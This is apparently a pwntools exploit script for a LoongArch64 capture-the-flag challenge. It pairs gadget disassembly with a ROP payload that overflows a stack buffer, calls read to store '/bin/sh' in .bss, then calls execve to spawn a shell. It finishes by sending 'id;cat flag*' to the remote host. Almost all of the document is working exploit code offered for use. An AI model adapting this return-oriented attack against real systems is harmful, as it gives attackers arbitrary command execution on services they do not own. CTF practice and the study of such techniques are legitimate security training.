from pwn import *
context.log_level = 'info'

if args.REMOTE:
  p = remote('guppy.utctf.live', 7133)
else:
  if args.GDB:
    p = process('~/work/qemu/last/build/qemu-loongarch64 -strace -D log3 -g 1235 hello', shell=True)
  else:
    p = process('~/work/qemu/last/build/qemu-loongarch64 -strace -D log3 hello', shell=True)

puts = 0x00000012000c438
gets = 0x00000012000c098
read = 0x00000012001df80
exit = 0x0000001200057e0
write = 0x00000012001e054
__NR_execve = 221
__NR_read = 63
__NR_write = 64

'''
   12000c034:   28c0a061        ld.d            $ra, $sp, 40(0x28)
   12000c038:   28c08077        ld.d            $s0, $sp, 32(0x20)
   12000c03c:   28c06078        ld.d            $s1, $sp, 24(0x18)
   12000c040:   28c04079        ld.d            $s2, $sp, 16(0x10)
   12000c044:   28c0207a        ld.d            $s3, $sp, 8(0x8)
   12000c048:   02c0c063        addi.d          $sp, $sp, 48(0x30)
'''
gadget0 = 0x12000c034

'''  12000b090:   28c1a061        ld.d            $ra, $sp, 104(0x68)
   12000b094:   001502e4        move            $a0, $s0
   12000b098:   28c18076        ld.d            $fp, $sp, 96(0x60)
   12000b09c:   28c16077        ld.d            $s0, $sp, 88(0x58)
   12000b0a0:   28c14078        ld.d            $s1, $sp, 80(0x50)
   12000b0a4:   28c12079        ld.d            $s2, $sp, 72(0x48)
   12000b0a8:   28c1007a        ld.d            $s3, $sp, 64(0x40)
   12000b0ac:   28c0e07b        ld.d            $s4, $sp, 56(0x38)
   12000b0b0:   28c0c07c        ld.d            $s5, $sp, 48(0x30)
   12000b0b4:   28c0a07d        ld.d            $s6, $sp, 40(0x28)
   12000b0b8:   02c1c063        addi.d          $sp, $sp, 112(0x70)
   12000b0bc:   4c000020        jirl            $zero, $ra, 0
'''
gadget1 = 0x12000b090

'''
   120048098:   0015008d        move            $t1, $a0
   12004809c:   28c12061        ld.d            $ra, $sp, 72(0x48)
   1200480a0:   28c02064        ld.d            $a0, $sp, 8(0x8)
   1200480a4:   28c04065        ld.d            $a1, $sp, 16(0x10)
   1200480a8:   28c06066        ld.d            $a2, $sp, 24(0x18)
   1200480ac:   28c08067        ld.d            $a3, $sp, 32(0x20)
   1200480b0:   28c0a068        ld.d            $a4, $sp, 40(0x28)
   1200480b4:   28c0c069        ld.d            $a5, $sp, 48(0x30)
   1200480b8:   28c0e06a        ld.d            $a6, $sp, 56(0x38)
   1200480bc:   28c1006b        ld.d            $a7, $sp, 64(0x40)
   1200480c0:   2b814060        fld.d           $fa0, $sp, 80(0x50)
   1200480c4:   2b816061        fld.d           $fa1, $sp, 88(0x58)
   1200480c8:   2b818062        fld.d           $fa2, $sp, 96(0x60)
   1200480cc:   2b81a063        fld.d           $fa3, $sp, 104(0x68)
   1200480d0:   2b81c064        fld.d           $fa4, $sp, 112(0x70)
   1200480d4:   2b81e065        fld.d           $fa5, $sp, 120(0x78)
   1200480d8:   2b820066        fld.d           $fa6, $sp, 128(0x80)
   1200480dc:   2b822067        fld.d           $fa7, $sp, 136(0x88)
   1200480e0:   02c24063        addi.d          $sp, $sp, 144(0x90)
   1200480e4:   4c0001a0        jirl            $zero, $t1, 0
'''
gadget2 = 0x120048098

'''
22555:   120013e30:	002b0000 	syscall     	0x0
22556-   120013e34:	4c000020 	jirl        	$zero, $ra, 0
'''
syscall = 0x120013e30

stack = 0x40008029a0
payload = 'A'*72
payload += p64(gadget0)
# put syscall address in $s0
payload += flat({
  32: p64(syscall),
  40: p64(gadget1),
})
# put $s0 in $a0
payload += flat({
  104: p64(gadget2),
})
# call syscall read with correct registers, we will store '/bin/sh' in .bss
payload += flat({
  8: p64(0),
  16: p64(0x00000012008d2d0),
  24: p64(8),
  64: p64(63),
  72: p64(gadget0),
  136: p64(0),
})
# put syscall address in $s0 again
payload += flat({
  32: p64(syscall),
  40: p64(gadget1),
})
# humm, put $s0 in $a0
payload += flat({
  104: p64(gadget2),
})
# we call syscall execve('/bin/sh', 0, 0) 
payload += flat({
  8: p64(0x00000012008d2d0),
  16: p64(0),
  24: p64(0),
  64: p64(__NR_execve),
  72: p64(gadget0),
  136: p64(0),
})




p.sendlineafter('\n', payload)
# command to execute so
p.sendline('/bin/sh\x00')
# enjoy shell
p.sendline('id;cat flag*')

p.interactive()
